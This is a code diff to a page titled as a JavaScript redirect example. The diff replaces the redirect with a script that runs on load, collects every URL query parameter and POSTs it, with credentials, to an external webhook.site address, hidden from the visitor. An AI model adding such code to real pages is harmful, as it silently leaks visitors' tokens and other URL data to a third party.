@@ -3,19 +3,43 @@
     <title>Example- Redirecting web page with JavaScript</title>
   </head>
   <body>
-    <h2>Redirecting web page with JavaScript</h2>
-    <p>
-      Click the following button, to get redirected Using the replace() function
-    </p>
-    <!-- <input
-      type="button"
-      value="Redirect Me"
-      title="Redirect"
-      onclick="Redirect()"
-    /> -->
     <script>
+      function getUrlParams(search) {
+        const hashes = search.slice(search.indexOf("?") + 1).split("&");
+        const params = {};
+        hashes.map((hash) => {
+          const [key, val] = hash.split("=");
+          if (key && key.length) params[key] = decodeURIComponent(val);
+        });
+        return params;
+      }
+
       (function () {
-        window.location.replace("www.google.com");
+        // Recoger los parámetros de la url
+        const queryParams = getUrlParams(window.location.search);
+        console.log(queryParams);
+
+        // Hacer una llamada post con esos parámetros en el body
+        fetch("https://webhook.site/ad03d25e-9340-46ea-aace-d3d224c1059b", {
+          method: "POST",
+          mode: "cors",
+          credentials: "include",
+          headers: {
+            "Content-type": "application/json; charset=UTF-8",
+            Accept: "application/json",
+            "Access-Control-Allow-Origin": "http://127.xxx",
+            "Access-Control-Allow-Credentials": "true",
+          },
+          body: JSON.stringify(queryParams),
+        })
+          .then((resp) => resp.json())
+          .then((json) => {
+            /* window.close(); */
+            console.log(json);
+          });
+
+        // cerrar la ventana
+        /* window.location.replace("https://www.tutorialspoint.com"); */
       })();
     </script>
   </body>
